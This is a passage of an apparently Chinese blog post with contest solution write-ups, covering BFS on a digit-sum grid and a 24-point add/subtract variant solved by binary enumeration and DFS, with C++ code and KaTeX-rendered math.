class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">123</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">456</span><span class="mclose">)</span></span></span></span> 横坐标与纵坐标的数位之和为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mn>3</mn><mo>+</mo><mn>4</mn><mo>+</mo><mn>5</mn><mo>+</mo><mn>6</mn><mo>=</mo><mn>21</mn></mrow><annotation encoding="application/x-tex">1+2+3+4+5+6=21</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">21</span></span></span></span></p><h3 id="输入描述-2">输入描述:</h3><p>第一行输入四个数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo separator="true">,</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n,m,k_1,k_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><h3 id="输出描述-2">输出描述:</h3><p>输出最多能够接到的单位体积的雨水数量</p><h3 id="题解复现-2">题解复现</h3><blockquote><ol><li><p>BFS（广度优先搜索算法）</p><p>BFS并不使用经验法则算法。从算法的观点，所有因为展开节点而得到的子节点都会被加进一个先进先出的队列中。一般的实验里，其邻居节点尚未被检验过的节点会被放置在一个被称为 open 的容器中（例如队列或是链表），而被检验过的节点则被放置在被称为 closed 的容器中。（open-closed表）</p><p>大致就是，以一个点为中心，遍历边上所有点，再将符合条件的点分别作为中心，继续相同操作。在本题中先以原点为中心将上下左右符合条件的点加入队列，每次从队首取元素同时弹出该元素，以该点为中心继续做相同操作，这样就能保证每次加入队列的元素及其前辈元素均符合条件。</p></li><li><p>队列：<strong>queue<type></strong></p><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">.push()</td><td style="text-align:center">加入队尾</td></tr><tr><td style="text-align:center">.pop()</td><td style="text-align:center">弹出队首</td></tr><tr><td style="text-align:center">.front()</td><td style="text-align:center">访问队首</td></tr><tr><td style="text-align:center">.back()</td><td style="text-align:center">访问队尾</td></tr><tr><td style="text-align:center">.empty()</td><td style="text-align:center">队列判空</td></tr><tr><td style="text-align:center">.size()</td><td style="text-align:center">元素个数</td></tr></tbody></table></li><li><p>make_pair(type, type) 函数无需参数类型即可快速创建 pair 类型数据。</p></li><li><p>pair 中的两个元素分别是 first 和 second ，只需要按正常结构体的方式去访问即可。</p></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, k1, k2;</span><br><span class="line"><span class="keyword">bool</span> grid[N][N];                   <span class="comment">//标记方格</span></span><br><span class="line"><span class="keyword">int</span> dx[] = &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span> &#125;;        <span class="comment">//控制上下左右移动</span></span><br><span class="line"><span class="keyword">int</span> dy[] = &#123; <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;            <span class="comment">//获取数位之和</span></span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (x) &#123;</span><br><span class="line">sum += x % <span class="number">10</span>;</span><br><span class="line">x /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y) &#123;</span><br><span class="line">sum += y % <span class="number">10</span>;</span><br><span class="line">y /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">grid[<span class="number">1</span>][<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">queue&lt;pii&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">pii p = q.<span class="built_in">front</span>();       <span class="comment">//每次循环以队首元素为中心</span></span><br><span class="line">q.<span class="built_in">pop</span>();                 <span class="comment">//及时将队首弹出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> x = p.first + dx[i];</span><br><span class="line"><span class="keyword">int</span> y = p.second + dy[i];</span><br><span class="line"><span class="keyword">if</span> (x &lt;= n &amp;&amp; x &gt;= <span class="number">1</span> &amp;&amp; y &lt;= m &amp;&amp; y &gt;= <span class="number">1</span> &amp;&amp; !grid[x][y]) &#123;</span><br><span class="line">grid[x][y] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="built_in">get</span>(x, y);</span><br><span class="line"><span class="keyword">if</span> (num &lt;= k2 &amp;&amp; num &gt;= k1) &#123;</span><br><span class="line">q.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(x, y));</span><br><span class="line">                    <span class="comment">//只有前辈元素在需求范围内才有机会加入队列</span></span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m &gt;&gt; k1 &gt;&gt; k2;</span><br><span class="line">cout &lt;&lt; <span class="built_in">bfs</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-24点游戏">C. 24点游戏</h2><h3 id="题目描述-3">题目描述</h3><p>小碘的妹妹喜欢玩 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn></mrow><annotation encoding="application/x-tex">24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 点的游戏。 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn></mrow><annotation encoding="application/x-tex">24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 点十棋牌类益智游戏，要求四个数字运算结果等于二十四，这个游戏用扑克牌更容易来开展。拿一副牌，抽去大小王后(也可以把J/Q/K/大小王也拿去)，剩下 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>～</mtext><mn>10</mn></mrow><annotation encoding="application/x-tex">1～10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">～</span><span class="mord">10</span></span></span></span> 这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>40</mn></mrow><annotation encoding="application/x-tex">40</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">40</span></span></span></span> 张牌。任意抽取 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 张牌(称为牌组)，用加、减、乘、除(可加括号)把牌面上的数算成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn></mrow><annotation encoding="application/x-tex">24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 。每张牌必须用且只能用一次。如抽出的牌是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mtext>、</mtext><mn>8</mn><mtext>、</mtext><mn>8</mn><mtext>、</mtext><mn>9</mn></mrow><annotation encoding="application/x-tex">3、8、8、9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">3</span><span class="mord cjk_fallback">、</span><span class="mord">8</span><span class="mord cjk_fallback">、</span><span class="mord">8</span><span class="mord cjk_fallback">、</span><span class="mord">9</span></span></span></span> ，那么算式为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>9</mn><mo>−</mo><mn>8</mn><mo stretchy="false">)</mo><mo>×</mo><mn>8</mn><mo>×</mo><mn>3</mn><mo>=</mo><mn>24</mn></mrow><annotation encoding="application/x-tex">(9-8)×8×3=24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 。 小碘的妹妹特别厉害，每次都能很快算出来，小碘想打败她就只能先改变 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn></mrow><annotation encoding="application/x-tex">24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 点的规则（可能因为他不会写 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn></mrow><annotation encoding="application/x-tex">24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 点的程序），然后写好程序，然后输入四个数，让系统自动生成解决方案。 小碘将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>24</mn></mrow><annotation encoding="application/x-tex">24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span> 的规则变成：让系统随机给五个数字，问是否可以让前四个数字只通过加、减变成第五个数字。</p><h3 id="输入描述-3">输入描述:</h3><p>第一行为一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>T</mi><mo>≤</mo><mn>100</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(1≤T≤100)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">100</span><span class="mclose">)</span></span></span></span> ，表示测试组数。<br>接下来的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 行，每行包括五个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">(</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mi>d</mi><mo lspace="0em" rspace="0em">≤</mo><mn>100000</mn><mo separator="true">,</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><mi>e</mi><mo lspace="0em" rspace="0em">≤</mo><mn>400000</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a,b,c,d,e(1{\leq}a,b,c,d{\leq}100000,1{\leq}e{\leq}400000)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord"><span class="mrel">≤</span></span><span class="mord">100000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal">e</span><span class="mord"><span class="mrel">≤</span></span><span class="mord">400000</span><span class="mclose">)</span></span></span></span> 。</p><h3 id="输出描述-3">输出描述:</h3><p>每组测试用例，输出一行一个整数。如果前四个数字可以变成第五个数字，输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mi>E</mi><mi>S</mi></mrow><annotation encoding="application/x-tex">YES</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord mathnormal" style="margin-right:0.05764em;">ES</span></span></span></span> ，否则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">NO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span></span></span></span> 。</p><h3 id="题解复现-3">题解复现</h3><blockquote><ol><li>送分题，但是我只会暴力枚举，官方题解提供了两种解法：<strong>二进制枚举</strong>与 <strong>DFS</strong> （深度优先搜索）</li><li>二进制枚举即 0000 ~ 1111 ，0 表示减，1表示加，遍历二进制数即可。</li><li>善用二进制位运算。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x;          <span class="comment">//全局变量，不用向函数传递参数</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>) sum += a[j];</span><br><span class="line"><span class="keyword">else</span> sum -= a[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sum == x) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) cin &gt;&gt; a[i];</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">f</span>()) cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;     <span class="comment">//若用 puts() 会方便一点</span></span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>DFS 类似于 BFS ，但是顾名思义，他会先沿一条线遍历到终点再返回遍历分支。</li><li>常用递归实现，本题数据较小，故不用担心爆栈。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">4</span>) <span class="keyword">return</span> m == x;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">f</span>(n + <span class="number">1</span>, m + a[n]) || <span class="built_in">f</span>(n + <span class="number">1</span>, m - a[n]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) cin &gt;&gt; a[i];</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">f</span>(<span class="number">0</span>, <span class="number">0</span>)) cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-奇怪的管子">D. 奇怪的管子</h2><h3 id="题目描述-4">题目描述</h3><p>lxy 在生日时收到了一件特殊的礼物，这件礼物由一个奇形怪状的管子和一些盘子组成.。这个管子是由许多不同直径的圆筒（直径也可以相同）同轴连接而成.。这个管子的底部是封闭的，顶部是打开的。下图是由直径为：5cm，6cm，4cm，3cm，6cm，2cm and 3cm 的圆筒组成的管子。</p><p><img src="https://uploadfiles.nowcoder.com/images/20220226/387943_1645881365897/882570FEF17AFBDB63B4C3D5233D8584" alt="图D-1"></p><p>每个圆筒的高度都是相等的，玩具中所带的盘子也是一些高度和它们相同的圆筒，直径有大有小。<br>lxy 发明了一种游戏，把盘子从管子顶部一个接一个的扔下去，他想知道最后这些盘子落在了哪，假设盘子落下过程中圆心和管子的轴一直保持一致，比如说我们丢下去三个盘子：3cm，2cm and 5cm，下图展示了最终它们的停止位置：<br><img src="https://uploadfiles.nowcoder.com/images/20220226/387943_1645881402636/81974B53817569FB89310DEEFB3EF86D" alt="图D-2"><br>如图可以知道,盘子掉下去以后，要么被某个圆筒卡住，要么就是因为掉在了以前的一个盘子上而停住。<br>lxy 想知道他最后扔下去的那个盘子掉在了哪个位置，你来帮他吧。</p><h3 id="输入描述-4">输入描述:</h3><p>第一行两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo stretchy="false">(</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo lspace="0em" rspace="0em">≤</mo><mn>300000</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m ( 1{\leq}n,m{\leq} 300 000)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mrel">≤</span></span><span class="mord">300000</span><span class="mclose">)</span></span></span></span> 表示水管包含的圆筒数以及盘子总数。<br>第二行给出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation 